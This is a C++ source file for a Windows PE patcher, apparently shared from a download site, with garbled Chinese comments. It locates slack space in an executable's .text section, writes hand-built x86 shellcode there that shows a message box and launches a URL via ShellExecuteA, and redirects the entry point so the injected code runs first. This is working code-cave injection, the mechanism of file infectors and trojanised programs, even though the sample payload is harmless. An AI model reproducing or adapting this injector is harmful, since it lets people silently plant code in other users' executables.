//Download by http://www.NewXing.com
#include "PE.h"

CPE::CPE(void)
{
}

CPE::~CPE(void)
{
}

bool CPE::GetPEAddress(const void* Basepoint)
{
	IMAGE_DOS_HEADER* pDosHead = (IMAGE_DOS_HEADER*)Basepoint;
	DWORD dwMod = 0;			//�߽����
	char tmp[4] = {0};

	if(pDosHead->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return false;
	}
	PE_HERDER* header;
	//��ȡPE�ļ�ͷ
	header = (PE_HERDER *)((char *)pDosHead + pDosHead->e_lfanew);	
	
	if(IsBadReadPtr(header,sizeof(*header)))		//ָ����
	{
		return false;
	}

	if(strstr((const char*)header->section_header[0].Name,".text") == NULL)		//���������
	{
		return false;
	}
	
	this->dwVirSize = header->section_header[0].Misc.VirtualSize;	//��ʵ����
	this->dwPhyAddress = header->section_header[0].PointerToRawData;//����ƫ��
	this->dwPhySize = header->section_header[0].SizeOfRawData;		//������С
	this->dwPeAddress = pDosHead->e_lfanew;							//PE�ļ�ͷƫ��
	this->dwSpace = this->dwPhySize - this->dwVirSize;				//�������ȼ���ʵ���ȵ��ڴ���εĿ��ÿռ�

 	this->dwRAV = header->opt_head.ImageBase;						
	this->dwCodeOffset = header->opt_head.BaseOfCode - this->dwPhyAddress;	//�������ƫ��

	this->dwEntryAddress = header->section_header[0].PointerToRawData + \
		header->section_header[0].Misc.VirtualSize;						

	this->dwWriteEntry = header->opt_head.BaseOfCode ;	//����д��ƫ��λ��

#ifdef __DEBUG
	cout<<"size = "<<this->dwVirSize<<endl;
	cout<<"phyAddress = "<<this->dwPhyAddress<<endl;
	cout<<"phy size = "<<this->dwPhySize<<endl;
	cout<<"dwPEaddress = "<<this->dwPeAddress<<endl;
	cout<<"Entry address = "<<this->dwEntryAddress<<endl;
	cout<<"base of code = "<<header->opt_head.BaseOfCode<<endl;
	cout<<"code offset = "<<this->dwCodeOffset<<endl;
#endif
	dwMod = this->dwWriteEntry%16;
	if(dwMod != 0)
	{
		this->dwWriteEntry += (16 - dwMod);
	}															//�߽����

	this->dwOldEntry = header->opt_head.AddressOfEntryPoint;	//����ɵ���ڵ�ַ
	this->dwNewEntry = this->dwWriteEntry + this->dwCodeOffset;	//��ȡ�µ���ڵ�ַ

#ifdef __DEBUG
	cout<<"old entry = "<<this->dwOldEntry<<endl;
	cout<<"new entry = "<<this->dwNewEntry<<endl;
#endif
	return true;

}

void CPE::DWORDTOSTR(DWORD dwAddress,unsigned char* chStr)
{
#ifdef __DEBUG
	cout<<"DWORD to Charactor..."<<endl;
#endif
	chStr[3] = (char)(dwAddress>>24)&0xff;
	chStr[2] = (char)(dwAddress>>16)&0xff;
	chStr[1] = (char)(dwAddress>>8)&0xff;
	chStr[0] = (char)(dwAddress)&0xff;
#ifdef __DEBUG
	cout<<chStr<<endl;
#endif
}

bool CPE::WriteNewEntry(int ret,long offset,DWORD dwAddress)
{
#ifdef __DEBUG
	cout<<"WriteNewEntry..."<<endl;
#endif
	long retf;
	unsigned char wAddress[4] = {0};

	try
	{
#ifdef __DEBUG
	cout<<"_lseeking file..."<<endl;
#endif

		retf = _lseek(ret,offset,SEEK_SET);
		if(retf == -1)
			throw GetLastError();
		unsigned char chTmp[4] = {0};
		DWORDTOSTR(dwAddress,chTmp);
		memcpy(wAddress,chTmp,4);

#ifdef __DEBUG
	cout<<"copy memory OK..."<<endl;
	cout<<"Address = "<<wAddress<<"\tchTmp = "<<chTmp<<endl;
#endif
		retf = _write(ret,wAddress,4);
#ifdef __DEBUG
	cout<<"write..."<<endl;
#endif
		if(retf == -1)
			throw GetLastError();
	}
	catch(DWORD ErrorCode)
	{
		return false;
	}
	return true;
}

bool CPE::WriteCode(int ret,long offset,char* strCap,char* strText,char* openFlag,char* Address)
{
	unsigned char strAddress_1[4] = {0};
	unsigned char strAddress_2[4] = {0};
	unsigned char strAddress_3[4] = {0};
	unsigned char wAddress[4] = {0};
	DWORD dwAddress = 0;

	//��ȡMessageBox���ڴ��е�ӳ��
	HINSTANCE hInst = LoadLibrary("user32.dll");
	this->dwCodeAddress = (DWORD)GetProcAddress(hInst,"MessageBoxA");

	HINSTANCE hShell = LoadLibrary("shell32.dll");
	this->dwShellAddress = (DWORD)GetProcAddress(hInst,"ShellExecuteA");
	//����У��λ
	int nLenCap = strlen(strCap) + 1;
	int nLenTxt = strlen(strText) + 1;
	int nLenAdr = strlen(Address) + 1;
	int nLenFlg = strlen(openFlag) + 1;

	int nLen = nLenFlg + nLenAdr + nLenCap + nLenTxt + 39;
	//���¼���MessageBoxA������ַ
	dwAddress = this->dwCodeAddress - (this->dwRAV + this->dwNewEntry + nLen - 5);
	DWORDTOSTR(dwAddress,strAddress_1);

	dwAddress = 0-(this->dwNewEntry - this->dwOldEntry + nLen);
	DWORDTOSTR(dwAddress,strAddress_2);

	dwAddress = this->dwShellAddress - (this->dwRAV + this->dwNewEntry + nLen - 5);
	DWORDTOSTR(dwAddress,strAddress_3);

	//���´�obj�ļ�����ȡ�Ĵ���
	
	unsigned char chHeader[2] = {0x6a,0x40};
	unsigned char chDesCap[5] = {0xe8,nLenCap,0x00,0x00,0x00};		//����
	unsigned char chText[5] = {0xe8,nLenTxt,0x00,0x00,0x00};		//����
	unsigned char chFix[14] = {
								0x6a,		//push
								0x00,		
								0xe8,		//call
								0x00,0x00,0x00,0x00,	
								0x6a,		//push
								0x05,		//SW_SHOW
								0x6a,
								0x00,		//NULL
								0x6a,
								0x00,		//NULL
								0x6a
								};
	unsigned char chPush[1] = {0x6a};
	unsigned char chParam[11] = {
								0x00,		//HWND NULL
								0xe8,		//call
								0x00,0x00,0x00,0x00,
								0xe9,		//jmp
								0x00,0x00,0x00,0x00
								};
	for(int i=0;i<4;i++)
	{
		chFix[3+i] = strAddress_1[i];		//MessageBoxA
		chParam[2+i] = strAddress_3[i];		//ShellExecuteA
		chParam[7+i] = strAddress_2[i];
	}
	char* cMsgBox = new char[nLen];
	char* cMsg;						//�ָ��

#ifdef __DEBUG
	cout<<"Len = "<<nLen<<endl;
#endif

	//�����ַ���
	memcpy((cMsg = cMsgBox),(char*)chHeader,2);
	memcpy((cMsg += 2),chDesCap,5);
	memcpy((cMsg += 5),strCap,nLenCap);
	memcpy((cMsg +=nLenCap),chText,5);
	memcpy((cMsg += 5),strText,nLenTxt);
	memcpy((cMsg += nLenTxt),chFix,14);	
	memcpy((cMsg += 14),Address,nLenAdr);
	memcpy((cMsg += nLenAdr),chPush,1);
	memcpy((cMsg += 1),openFlag,nLenFlg);
	memcpy((cMsg += nLenFlg),chParam,11);

	//д��Ի������
#ifdef __DEBUG
	cout<<"Write to file..."<<endl;
	cout<<cMsg<<endl;
	cout<<"End....."<<endl;
#endif
	long retf;
	try
	{
#ifdef __DEBUG
		cout<<"ret = "<<ret<<endl;
		cout<<"dwWriteEntry = "<<(long)this->dwWriteEntry<<endl;
		ofstream outfile("Dump.txt");
		outfile<<cMsg;
		outfile.close();
#endif
		retf = _lseek(ret,(long)this->dwWriteEntry,SEEK_SET);
		if(retf == -1)
			throw GetLastError();
		retf = _write(ret,cMsgBox,nLen);
		if(retf == -1)
			throw GetLastError();
	}
	catch(DWORD dwError)
	{
		delete[] cMsgBox; 
		return false;
	}
	delete[] cMsgBox;
	return true;
}

bool CPE::WriteFile(char* FileName)
{
	int ret = 0;

	try
	{
#ifdef __DEBUG
	cout<<"Open PE File"<<endl;
#endif
		ret = _open(FileName,_O_RDWR | _O_CREAT | _O_BINARY, _S_IREAD | _S_IWRITE);
		if(ret == -1)
			throw GetLastError();
		if(!this->WriteNewEntry(ret,(long)(this->dwPeAddress+40),this->dwNewEntry))
			throw -1;
		if(!this->WriteCode(ret,(long)this->dwWriteEntry,"��Ϣ...","���Ծ�̬ע��","open","http://www.baidu.com"))
			throw -1;
	}
	catch(DWORD dwError)
	{
		_close(ret);
		return false;
	}
	_close(ret);
	return true;
}

bool CPE::ModifyPE(char* strFileName)
{
#ifdef __DEBUG
	cout<<"Modifying PE File..."<<endl;
#endif
	void* BasePoint = NULL;
	char* ErrorMsg;
	HANDLE hFile = NULL;
	HANDLE hMapping = NULL;
#ifdef __DEBUG
	cout<<"Getting Base Pointer..."<<endl;
#endif
	try
	{
		hFile = CreateFile(strFileName,GENERIC_READ | GENERIC_WRITE,
				 FILE_SHARE_READ | FILE_SHARE_WRITE,0,
				 OPEN_EXISTING,FILE_FLAG_SEQUENTIAL_SCAN,NULL);
		if(hFile == INVALID_HANDLE_VALUE)
			throw -1;

		hMapping = CreateFileMapping(hFile,NULL,PAGE_READONLY | SEC_COMMIT,0,0,0);

		if(hMapping == INVALID_HANDLE_VALUE)
			throw -1;

		if(!(BasePoint = MapViewOfFile(hMapping,FILE_MAP_READ,0,0,0)))
			throw NULL;
	}
	catch(int ErrorCode)
	{
		CloseHandle(hFile);
		CloseHandle(hMapping);
		return false;
	}
	CloseHandle(hFile);
	CloseHandle(hMapping);
	GetPEAddress(BasePoint);
	UnmapViewOfFile(BasePoint);
#ifdef __DEBUG
	cout<<"Writing PE File"<<endl;
#endif
	bool bol = true;
	if(this->dwSpace>50)
	{
		bol = WriteFile(strFileName);
	}
	return bol;
}